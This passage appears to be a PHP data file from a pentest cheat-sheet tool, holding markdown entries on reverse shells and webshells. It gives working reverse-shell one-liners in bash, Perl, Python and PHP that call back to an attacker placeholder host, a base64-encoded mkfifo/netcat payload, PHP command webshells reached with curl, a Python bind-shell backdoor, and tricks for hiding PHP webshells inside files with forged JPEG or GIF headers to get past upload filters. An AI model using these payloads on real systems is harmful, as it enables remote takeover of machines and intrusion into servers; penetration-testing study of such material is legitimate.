
Launch the reverse shell on your target:
```
bash -i >& /dev/tcp/IPKALI/4444 0>&1
```


',
  ),
  'Webshell-perl' => 
  array (
    'category' => 'Webshell',
    'id' => 'perl',
    'title' => 'Reverse shell: Perl',
    'desc' => '## Reverse shell: Perl

Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell in perl on your target:
```
perl -e \'use Socket;$i="IPKALI";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};\'
```


',
  ),
  'Webshell-python' => 
  array (
    'category' => 'Webshell',
    'id' => 'python',
    'title' => 'Reverse shell: Python',
    'desc' => '## Reverse shell: Python

Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell in python on your target:
```
python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((IPKALI,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/bash)\'
```


',
  ),
  'Webshell-php' => 
  array (
    'category' => 'Webshell',
    'id' => 'php',
    'title' => 'Reverse shell: Php',
    'desc' => '## Reverse shell: Php

Launch a listening nc on your host:
```
nc -lvp 4444
```

Launch the reverse shell in php on your target:
```
php -r \'$sock=fsockopen("IPKALI",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'
```


',
  ),
  'Webshell-webphp' => 
  array (
    'category' => 'Webshell',
    'id' => 'webphp',
    'title' => 'Web server: cmd.php',
    'desc' => '## Web server: cmd.php

If you can upload a php file to the web server, the file below will allow you to run shell commands:
```
&lt?php echo \'Shell: \';system($_GET[\'cmd\']); ?>
```

Run \'id\' on the server
```
curl http://IPSERVER/cmd.php?cmd=id
```


',
  ),
  'Webshell-webphp22' => 
  array (
    'category' => 'Webshell',
    'id' => 'webphp22',
    'title' => 'Web server: cmd.php (clean html)',
    'desc' => '## Web server: cmd.php (clean html)

Upload the file
```
&ltpre>&lt?php echo \'Shell: \';system($_GET[\'cmd\']); ?>&lt/pre>
```

Run \'id\' on the server
```
curl http://IPSERVER/cmd.php?cmd=id
```


',
  ),
  'Webshell-webphpbase64' => 
  array (
    'category' => 'Webshell',
    'id' => 'webphpbase64',
    'title' => 'Web server: PHP code base64 encoded',
    'desc' => '## Web server: PHP code base64 encoded

Sometimes some characters like ; the & or the | are filtered. A base64 encoding allows to get out of it.<br/>
Base64 encode your command in an xterm:
```
$ printf \'system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IPKALI 4444 >/tmp/f");\' | base64
```

Paste de base64 encoded command in PHP reverse shell code:
```
eval(base64_decode(\'c3lzdGVtKCJyEtxxxxxxxxxEkgNDQ0NCA+L3RtcC9mIik7=\'));
```


',
  ),
  'Webshell-pythonbind' => 
  array (
    'category' => 'Webshell',
    'id' => 'pythonbind',
    'title' => 'Python bind shell',
    'desc' => '## Python bind shell

```
import sys,socket,time,re,subprocess,os

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((\'0.0.0.0\',4444))
sock.listen(5)
conn,addr = sock.accept()
conn.send(\'== YOLO Backdoor ==\\n\\n>\')
while 1:
data = conn.recv(1024)
cmd = data.strip().split(\' \')
if cmd[0] == \'cd\':
os.chdir(cmd[1])
elif cmd[0] in (\'exit\'):
break
else:
conn.send(subprocess.check_output(cmd)+\'\\n>\')
conn.close()
sock.shutdown(socket.SHUT_RDWR)
sock.close()
```


',
  ),
  'Webshell-imgwebshell' => 
  array (
    'category' => 'Webshell',
    'id' => 'imgwebshell',
    'title' => 'File upload Webshell : Jpeg',
    'desc' => '## File upload Webshell : Jpeg

If you can upload a jpg file, it is possible to hide a webshell in it.<br/>
A jpeg file is identified by its first bytes which have the value: ffd8ffe0  <br/>
To generate a file that will be identified as having a valid Jpeg header:
```
printf &quot;\\xff\\xd8\\xff\\xe0&lt?php system(\'id\'); ?>&quot; > webshell.jpg
```

This file will be recognized as a jpg file
```
$ file webshell.jpg
webshell.jpg: JPEG image data
```


',
  ),
  'Webshell-imgwebshell2' => 
  array (
    'category' => 'Webshell',
    'id' => 'imgwebshell2',
    'title' => 'File upload Webshell : Gif',
    'desc' => '## File upload Webshell : Gif

A Gif file is identified by its first bytes which have the value: GIF89a;  <br/>
To generate a file that will be identified as having a valid gif header:<br/>
```
printf &quot;GIF89a;&lt?php system(\'id\'); ?>&quot; > webshell.gif
```

This file will be recognized as a gif file
```
$ file webshell.gif
webshell.gif: GIF image data
```


',
  ),
  'Webshell-payloadallthethings' => 
  array (
    'category' => 'Webshell',
    'id' => 'payloadallthethings',
    'title' => 'References: PayloadAllTheThings and PentestMonkey',
    'desc' => '## References: PayloadAllTheThings and PentestMonkey

You want to know more ?<br/>
Some webshells
```
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
```

Pure php Webshell: <a href=php-reverse-shell.php.txt>php-reverse-shell.php</a>
```
https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
```

Yop Webshell: <a href=yopwebshell.php.txt>yopwebshell.php</a><br/>
Yolo Webshell: <a href=yolowebshell.php.txt>yolowebshell.php</a>


',
  ),
);
?>